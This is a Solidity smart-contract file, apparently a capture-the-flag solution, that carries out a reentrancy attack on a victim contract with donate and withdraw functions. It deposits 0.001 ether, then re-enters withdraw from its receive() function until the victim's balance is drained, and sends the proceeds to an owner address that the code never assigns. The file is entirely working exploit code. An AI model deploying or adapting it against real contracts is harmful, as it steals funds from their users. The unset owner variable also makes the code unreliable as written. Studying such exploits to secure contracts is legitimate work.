// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentranceAttack {

    address victim;
    address owner;

    constructor(address _victim) {
        victim = _victim;
    }
    uint amount = 0.001 ether;
    bytes4 constant DONATE = bytes4(keccak256('donate(address)'));
    bytes4 constant WITHDRAW = bytes4(keccak256('withdraw(uint256)'));

    function attack() external payable {
        
        // deposit 0.001 eth
        (bool donate, ) = victim.call{value: amount}(abi.encodeWithSelector(DONATE, address(this)));
        require(donate);
        (bool withdraw, ) = victim.call(abi.encodeWithSelector(WITHDRAW, amount));
        require(withdraw);
    }

    receive() external payable {
        // check balance of the victim and call again
        if(address(victim).balance > 0) {
            (bool withdraw, ) = victim.call(abi.encodeWithSelector(WITHDRAW, amount));
            require(withdraw);
        }
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }

}